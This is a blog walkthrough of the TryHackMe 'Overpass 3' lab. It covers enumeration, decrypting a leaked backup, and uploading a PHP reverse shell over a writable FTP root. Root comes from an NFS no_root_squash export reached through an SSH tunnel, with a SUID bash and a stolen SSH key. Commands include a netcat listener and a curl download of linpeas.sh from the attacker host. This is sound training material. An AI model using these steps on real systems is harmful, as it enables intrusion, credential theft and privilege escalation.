---
layout: post
title: TryHackMe Walkthrough - Overpass 3 - Hosting
date: 2021-06-05
type: post
tags:
- Walkthrough
- Hacking
- TryHackMe
- Boot2Root
- Medium
permalink: /2021/06/Overpass3
img: 2021/06/Overpass3/overpass3.png
---

This is the third room of the Overpass series. After trying to build a [password manager](https://tryhackme.com/room/overpass) that was [hacked](https://tryhackme.com/room/overpass2hacked), the overpass bunch now try to launch an [hosting company](https://tryhackme.com/room/overpass3hosting). Let's see if I can hack them.

* Room: Overpass 3 - Hosting
* Difficulty: Medium
* URL: https://tryhackme.com/room/overpass3hosting

```
After Overpass's rocky start in infosec, and the commercial failure of their password manager and subsequent hack, they've decided to try a new business venture.

Overpass has become a web hosting company!
Unfortunately, they haven't learned from their past mistakes. Rumour has it, their main web server is extremely vulnerable.
```


## Enumeration

I started by looking at opened ports on the machine. The room description mentions a vulnerable web server, but there might be other interesting ports.

```bash
nmap -A -oN nmap.txt target

# Nmap 7.91 scan initiated Fri Mar 19 19:59:02 2021 as: nmap -A -oN nmap.txt target
Nmap scan report for target (10.10.146.68)
Host is up (0.62s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: Overpass Hosting
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar 19 20:00:36 2021 -- 1 IP address (1 host up) scanned in 93.72 seconds
```

The machine as port 21 (FTP), 22 (SSH) and 80 (HTTP) opened. 

## Web Site

I started by looking at the web site. 

![Overpass Site](/assets/images/2021/06/Overpass3/01-OverpassSite.png "Overpass Site")

It's a static site, without much on it. There is a list of name, maybe they can be used as usernames? 

I found this little gem in the home page source code. Make sure your read the contract when your hosting company promise 5 nines. 
```html
We promise a 5 nines uptime,
            <!-- 0.99999% is 5 nines, right? -->and negotiable service level agreements down to of a matter of days to keep your business
            running smoothly even when technology gets in the way.
```

Other than then potential usernames, there was nothing that I could use on the home pages, and no links to other pages. Next, I tried finding hidden pages.

```bash
gobuster dir -e -u http://target.com/.com/ -t30 -w /usr/share/dirb/wordlists/common.txt  | tee gobuster.txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.com/.com/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/03/19 20:05:35 Starting gobuster in directory enumeration mode
===============================================================

http://target.com/.com/.htpasswd            (Status: 403) [Size: 218]
http://target.com/.com/.hta                 (Status: 403) [Size: 213]
http://target.com/.com/.htaccess            (Status: 403) [Size: 218]
http://target.com/.com/backups              (Status: 301) [Size: 230] [--> http://target.com//backups/]
http://target.com//cgi-bin/             (Status: 403) [Size: 217]
http://target.com//index.html           (Status: 200) [Size: 1770]
===============================================================
2021/03/19 20:06:20 Finished
===============================================================
```

There was three folders found by Gobuster.
* /backups/ 
* /icons/
* /cgi-bin/

The backups folder contained a file called backup.zip. I downloaded the file and uncompressed it. It contained an encrypted xlsx file, and the private key to decrypt it. 

I imported the key, then used it to decypt the file. 

```bash
$ unzip backup.zip 
Archive:  backup.zip                                                                                                 
 extracting: CustomerDetails.xlsx.gpg
  inflating: priv.key

$ gpg --import priv.key 
gpg: key C9AE71AB3180BC08: public key "Paradox <paradox@overpass.thm>" imported
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

$ gpg --decrypt CustomerDetails.xlsx.gpg > CustomerDetails.xlsx         
gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"

$ file CustomerDetails.xlsx
CustomerDetails.xlsx: Microsoft Excel 2007+
```

The spreadsheet contains customer names, usernames, passwords, and credit cards information.

| Customer Name | Username | Password | Credit card number | CVC |
| :--- | :--- | :--- |  :--- | :--- |
Par. A. Doxx  |  paradox |  PASSWORD |  4111 1111 4555 1142 |  432 | 
0day Montgomery |  0day |  PASSWORD |  5555 3412 4444 1115 |  642 | 
Muir Land |  muirlandoracle |  PASSWORD |  5103 2219 1119 9245 |  737 | 

The `/icons` folder contained some icons and some text explaining their use. I seems to be an old default Apache page (Nmap identified version 2.4.37). 

![Apache Icons](/assets/images/2021/06/Overpass3/02-ApacheIcons.png "Apache Icons")

The `/cgi-bin/` did not have directory listing enabled. 

I ran Gobuster on the 3 found folders, but it did not found anything else of interest.

## Getting a Shell

I had a bunch of credentials, so I tried them on the FTP server to see if any works.

I tried paradox's credentials first and it worked. The server contained the source to the website and the backup.zip folder. 

The other 2 sets of credentials did not work.

I also tried to the credentials to connect by ssh. They all got rejected.

I connected back to the FTP as paradox and took a closer look at the listing to see if I missed anything.

```bash
ftp target
Connected to target.

220 (vsFTPd 3.0.3)
Name (target:ehogue): paradox
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    3 48       48             94 Mar 20 15:26 .
drwxrwxrwx    3 48       48             94 Mar 20 15:26 ..
drwxr-xr-x    2 48       48             24 Nov 08 21:25 backups
-rw-r--r--    1 0        0           65591 Nov 17 20:42 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17 20:42 index.html
-rw-r--r--    1 0        0             576 Nov 17 20:42 main.css
-rw-r--r--    1 0        0            2511 Nov 17 20:42 overpass.svg
```

It looks like the folder might be writable. I tried uploading a file and it worked. I didn't know which language, if any, would be supported by the server. So I tried uploading a simple PHP file to see if it would be interpreted, or if the code would just be printed. 

```bash
cat test.php 
<?php
echo 'It works';
```

```bash
put test.php
local: test.php remote: test.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
24 bytes sent in 0.00 secs (40.4095 kB/s)
```

Uploading the file worked. Now I tried accessing it in a browser by going to http://target.com/test.php . The page showed me 'It works'. So that confirmed that PHP code was executed. 

To get a shell on the server, I uploaded the PHP reverse shell from `/usr/share/webshells/php/php-reverse-shell.php`, started a Netcat listener on my machine and navigated to http://target.com/php-reverse-shell.php .

```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.30.1 35038
Linux ip-10-10-30-1 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 15:35:48 up  2:15,  0 users,  load average: 0.00, 0.00, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (896): Inappropriate ioctl for device
sh: no job control in this shell

sh-4.4$ whoami
whoami
apache

sh-4.4$ pwd
/
pwd

sh-4.4$ cd
cd

sh-4.4$ pwd
/usr/share/httpd
pwd

sh-4.4$ ls -l
ls -l
total 20
drwxr-xr-x. 3 root root 4096 Nov  8  2020 error
drwxr-xr-x. 3 root root 8192 Nov  8  2020 icons
drwxr-xr-x. 3 root root  140 Nov  8  2020 noindex
-rw-r--r--. 1 root root   38 Nov 17  2020 web.flag

sh-4.4$ cat web.flag
cat web.flag
WEB FLAG
```

I had access to the machine, and the first flag.

## Escalation to paradox
Now that I had access to the server, I needed to get access to a user account.

There are two users on the server: james and paradox. We have passwords found in the file from earlier, so I tried them with `su`. The credentials for paradox worked. None of the passwords worked for james.

```bash
$ su paradox
Password: 

[paradox@ip-10-10-30-1 /]$ whoami
paradox
```

I copied my public key to paradox's authorized_keys. So I was able to reconnect directly using ssh.

```bash
echo "MY_PULIC_KEY" > ~/.ssh/authorized_keys
```

## Getting the User Flag
The home folder for paradox contains files with the customer information we found in the backups folder of the web site. 

```bash
ssh paradox@target    
Last login: Sat Mar 20 17:00:24 2021                    

[paradox@ip-10-10-30-1 ~]$ ls -la                      
total 56                                                 
drwx------. 4 paradox paradox   203 Nov 18 18:29 .   
drwxr-xr-x. 4 root    root       34 Nov  8 19:34 ..
-rw-rw-r--. 1 paradox paradox 13353 Nov  8 21:23 backup.zip
lrwxrwxrwx. 1 paradox paradox     9 Nov  8 21:45 .bash_history -> /dev/null
-rw-r--r--. 1 paradox paradox    18 Nov  8  2019 .bash_logout
-rw-r--r--. 1 paradox paradox   141 Nov  8  2019 .bash_profile
-rw-r--r--. 1 paradox paradox   312 Nov  8  2019 .bashrc
-rw-rw-r--. 1 paradox paradox 10019 Nov  8 20:37 CustomerDetails.xlsx
-rw-rw-r--. 1 paradox paradox 10366 Nov  8 21:18 CustomerDetails.xlsx.gpg
drwx------. 4 paradox paradox   132 Nov  8 21:18 .gnupg
-rw-------. 1 paradox paradox  3522 Nov  8 21:16 priv.key
drwx------  2 paradox paradox    47 Nov 18 18:32 .ssh 

```

I couldn't tell if there were the same version I found earlier. So I used scp to download them on my box and look at them. 

```bash
$ scp paradox@target:~/backup.zip .
$ scp paradox@target:~/CustomerDetails.xlsx .
$ scp paradox@target:~/CustomerDetails.xlsx.gpg .
```

This gave me 3 versions of the CustomerDetails spreadsheet. One directly in the home folder, one encrypted, and one in the zip file. They all appeared to contain the same data. So I had to keep looking. 

I spend some time looking around the server and did not find anything. So I decided to try if [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) would find something.

I started a web server on my machine. 
```bash
sudo python3 -m http.server 80
```

Then use it to download the script on the target server.  And then run it.
```bash
curl http://10.13.3.36/linpeas.sh -o linpeas.sh

chmod +x linpeas.sh
./linpeas.sh | tee linpeasRes.txt
```

Since linpeas take some time to run, and output a lot of data, I always redirect it's output to a file. This way I can go back to look at it. And I can download it to my machine. 

Note that LinPEAS produces colored text. So you can't opened it in the text editor. Use `less -r linpeasRes.txt` to read it.

LinPEAS found a possible problem with the NFS export

![LinPEAS NFS](/assets/images/2021/06/Overpass3/03-LinPEASNFS.png "LinPEAS NFS")

The [provided link](https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe) has two possible exploits, one for remote, and one for local exploitation.

I tried running the remote exploit, but I couldn't connect to it. The NFS port was closed.

```bash
root@kali:~# mkdir /tmp/pe

root@kali:~# mount -t nfs target:/ /tmp/pe
mount.nfs: Connection timed out
```

I tried the local exploit, but the target machine does not have gcc installed. The page note that the remote exploit will work though a ssh tunnel, so I decided to try that first.

I looked for the port used by NFS.

```bash
[paradox@ip-10-10-237-235 ~]$ rpcinfo -p | grep nfs
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
```

And opened a ssh tunnel for this port
```bash
ssh -L 2049:localhost:2049 paradox@target
```

Then I followed the instructions to mound the NFS locally as root.
```bash
root@kali:~# sudo apt install libnfs-utils

root@kali:~# mount -t nfs localhost:/ /tmp/pe

root@kali:~# ls /tmp/pe/
user.flag

root@kali:~# cat /tmp/pe/user.flag 
USER FLAG
```

I had the home folder of james locally with the user flag in it.

## Getting root

To get root, I followed the instructions from HackTricks to upload a bash binary with suid set as root.

```bash
$ cd /tmp/pe
$ cp /bin/bash .
$ chmod +s bash
```

Because of the `no_root_squash` option on the NFS mount, james' home folder now contained a bash executable owned by root with the suid bit set. So if james ran it, it will run as root.

I did not have james password, but since I had their home folder mounted, I could see their ssh private key. And use it to connect to the server as james. 

```bash
$ ls /tmp/pe/.ssh/
authorized_keys  id_rsa  id_rsa.pub

$ ssh james@target -i /tmp/pe/.ssh/id_rsa
Last failed login: Sat Jun  5 13:55:53 BST 2021 on pts/1
There were 4 failed login attempts since the last successful login.
Last login: Wed Nov 18 18:26:00 2020 from 192.168.170.145
```

Once connected, I could run the version of bash that has the suid bit set to become root and get the last flag.

```bash
[james@ip-10-10-237-235 ~]$ ./bash -p
./bash: /lib64/libtinfo.so.6: no version information available (required by ./bash)

bash-5.1# whoami
root

bash-5.1# cat /root/root.flag 
ROOT FLAG
```


## The Overpass Series
That was the last room of the Overpass series. I have done the first two a while ago. From memory they were easier than this one. I should probably redo then and do a writeup for them also. 

I really enjoyed the series, thanks to [NinjaJc01](https://tryhackme.com/p/NinjaJc01) for creating it.

